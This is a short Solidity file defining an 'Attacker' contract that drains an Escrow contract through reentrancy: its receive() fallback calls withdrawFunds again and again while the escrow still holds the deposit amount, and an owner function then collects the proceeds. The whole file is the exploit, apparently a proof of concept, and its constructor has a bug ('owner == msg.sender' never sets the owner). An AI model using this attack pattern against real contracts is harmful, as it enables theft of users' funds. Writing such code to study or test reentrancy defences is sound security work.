// SPDX-License-Identifier: MIT
pragma solidity >=0.6.2 <0.9.0;
import {Escrow} from "./Escrowinterface.sol";

contract Attacker {
    address owner;

    Escrow escrow;
    uint256 deposit;
    bytes32 escrowID;

    event Exploited(address target, uint256 balance);

    constructor() {
        owner == msg.sender;
    }

    function attack(
        bytes32 _escrowID,
        address _victim,
        uint256 _deposit
    ) external {
        escrow = Escrow(_victim);
        escrowID = _escrowID;
        deposit = _deposit;
        escrow.withdrawFunds(escrowID);
    }

    function transferBalance() external {
        require(msg.sender == owner, "only owner can withdraw");
        address payable _owner = payable(msg.sender);
        _owner.transfer(address(this).balance);
    }

    receive() external payable {
        if (address(escrow).balance >= deposit) {
            escrow.withdrawFunds(escrowID);
        }
        emit Exploited(address(escrow), address(escrow).balance);
    }
}